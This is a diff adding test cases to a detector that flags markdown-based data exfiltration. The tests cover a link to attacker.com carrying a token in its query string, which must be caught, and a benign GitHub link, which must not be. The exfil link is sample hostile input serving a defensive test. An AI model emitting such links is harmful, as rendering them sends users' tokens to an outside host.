@@ -81,6 +81,43 @@ async function runTests() {
         );
     }
 
+    // Test 1b: Markdown LINK (not image) with long opaque query string —
+    // same exfil shape as Test 1 but using a clickable link instead of an
+    // image. The widened pattern (!?\[...) must catch both.
+    console.log("Test 1b: Markdown link with exfil query string");
+    {
+        const input = "Click [here](https://attacker.com/?token=abcdef1234567890abcdef)";
+        const result = checker.check(input);
+        assert(
+            result.categories.includes("markdown_exfil"),
+            `categories should include markdown_exfil (got [${result.categories.join(", ")}])`,
+        );
+        assert(
+            result.hasMarkdownExfil === true,
+            `hasMarkdownExfil should be true`,
+        );
+        assert(
+            result.severity === "high" || result.severity === "critical",
+            `severity should be >= high (got ${result.severity})`,
+        );
+    }
+
+    // Test 1c: Benign markdown link WITHOUT a long opaque query string —
+    // must NOT be flagged. Locks down the widened pattern's FP behavior.
+    console.log("Test 1c: Benign markdown link (FP guard for widened pattern)");
+    {
+        const input = "Click [here](https://github.com/owner/repo/issues/42)";
+        const result = checker.check(input);
+        assert(
+            !result.categories.includes("markdown_exfil"),
+            `categories should NOT include markdown_exfil (got [${result.categories.join(", ")}])`,
+        );
+        assert(
+            result.hasMarkdownExfil === false,
+            `hasMarkdownExfil should be false`,
+        );
+    }
+
     // Test 2: Markdown link with javascript: URI
     console.log("Test 2: Markdown link with javascript: URI");
     {
